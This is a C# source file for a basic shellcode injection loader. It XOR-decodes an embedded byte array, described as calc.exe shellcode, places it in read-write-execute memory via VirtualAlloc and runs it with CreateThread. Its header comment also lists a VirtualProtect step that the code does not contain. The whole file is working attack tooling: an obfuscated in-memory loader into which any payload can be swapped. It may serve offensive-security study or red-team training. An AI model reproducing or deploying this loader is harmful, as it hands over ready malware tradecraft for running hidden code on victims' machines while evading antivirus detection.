using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.IO;
using System.Runtime.ConstrainedExecution;
using System.Security;
using System.Text;

/*
 * This program has 4 steps:
 * 1. Decoding calc.exe shellcode via XOR.
 * 2. Allocate some space for it via VirtualAlloc and copying the shellcode into said space (with the correct permissions)
 * 3. Changing permissions of the space to RWX via VirtualProtect
 * 4. Executing it via CreateThread
 */

namespace BasicShellcodeInjection
{
    class Program
    {
        static void error(string functionName)
        {
            Console.WriteLine($"[-] {functionName} Failed With Error : {Marshal.GetLastWin32Error()}");
        }

        static void log(string logText)
        {
            Console.WriteLine($"[+] {logText}");
        }

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        public static extern IntPtr VirtualAlloc(IntPtr lpAddress, int dwSize, UInt32 flAllocationType, UInt32 flProtect);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        public enum StateEnum
        {
            MEM_COMMIT = 0x1000,
            MEM_RESERVE = 0x2000,
            MEM_FREE = 0x10000
        }
        public enum Protection
        {
            PAGE_READONLY = 0x02,
            PAGE_READWRITE = 0x04,
            PAGE_EXECUTE = 0x10,
            PAGE_EXECUTE_READ = 0x20,
            PAGE_EXECUTE_READWRITE = 0x40,
        }

        public static void Main(string[] args)
        {
            byte[] ObfuscatedPayload = new byte [193] {
            0x85, 0x91, 0xfb, 0x79, 0x79, 0x79, 0x19, 0xf0, 0x9c, 0x48, 
            0xb9, 0x1d, 0xf2, 0x29, 0x49, 0xf2, 0x2b, 0x75, 0xf2, 0x2b, 
            0x6d, 0xf2, 0x0b, 0x51, 0x76, 0xce, 0x33, 0x5f, 0x48, 0x86, 
            0xd5, 0x45, 0x18, 0x05, 0x7b, 0x55, 0x59, 0xb8, 0xb6, 0x74, 
            0x78, 0xbe, 0x9b, 0x8b, 0x2b, 0x2e, 0xf2, 0x2b, 0x69, 0xf2, 
            0x33, 0x45, 0xf2, 0x35, 0x68, 0x01, 0x9a, 0x31, 0x78, 0xa8, 
            0x28, 0xf2, 0x20, 0x59, 0x78, 0xaa, 0xf2, 0x30, 0x61, 0x9a, 
            0x43, 0x30, 0xf2, 0x4d, 0xf2, 0x78, 0xaf, 0x48, 0x86, 0xd5, 
            0xb8, 0xb6, 0x74, 0x78, 0xbe, 0x41, 0x99, 0x0c, 0x8f, 0x7a, 
            0x04, 0x81, 0x42, 0x04, 0x5d, 0x0c, 0x9d, 0x21, 0xf2, 0x21,
            0x5d, 0x78, 0xaa, 0x1f, 0xf2, 0x75, 0x32, 0xf2, 0x21, 0x65, 
            0x78, 0xaa, 0xf2, 0x7d, 0xf2, 0x78, 0xa9, 0xf0, 0x3d, 0x5d, 
            0x5d, 0x22, 0x22, 0x18, 0x20, 0x23, 0x28, 0x86, 0x99, 0x26, 
            0x26, 0x23, 0xf2, 0x6b, 0x92, 0xf4, 0x24, 0x13, 0x78, 0xf4, 
            0xfc, 0xcb, 0x79, 0x79, 0x79, 0x29, 0x11, 0x48, 0xf2, 0x16, 
            0xfe, 0x86, 0xac, 0xc2, 0x89, 0xcc, 0xdb, 0x2f, 0x11, 0xdf, 
            0xec, 0xc4, 0xe4, 0x86, 0xac, 0x45, 0x7f, 0x05, 0x73, 0xf9, 
            0x82, 0x99, 0x0c, 0x7c, 0xc2, 0x3e, 0x6a, 0x0b, 0x16, 0x13, 
            0x79, 0x2a, 0x86, 0xac, 0x1a, 0x18, 0x15, 0x1a, 0x57, 0x1c, 
            0x01, 0x1c, 0x79};

            int sSize = ObfuscatedPayload.Length;
            byte xorKey = 0x79;
            byte[] DeobfuscatedPayload = new byte[sSize];

            for (int i = 0; i < sSize; i++)
            {
                DeobfuscatedPayload[i] = (byte)(ObfuscatedPayload[i] ^ xorKey);
            }
            log("Deobfuscated shellcode");

            // MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE
            IntPtr pPayload = VirtualAlloc(IntPtr.Zero, sSize, (uint)StateEnum.MEM_COMMIT | (uint)StateEnum.MEM_RESERVE, (uint)Protection.PAGE_EXECUTE_READWRITE);
            log("Allocated space");

            Marshal.Copy(DeobfuscatedPayload, 0, pPayload, sSize) ;
            log("Copied payload");

            IntPtr hThread = IntPtr.Zero;
            UInt32 threadId = 0;
            log("Executing Thread...");

            hThread = CreateThread(0, 0, (uint)pPayload, IntPtr.Zero, 0, ref threadId);
            WaitForSingleObject(hThread, 0xFFFFF);
        }
    }
}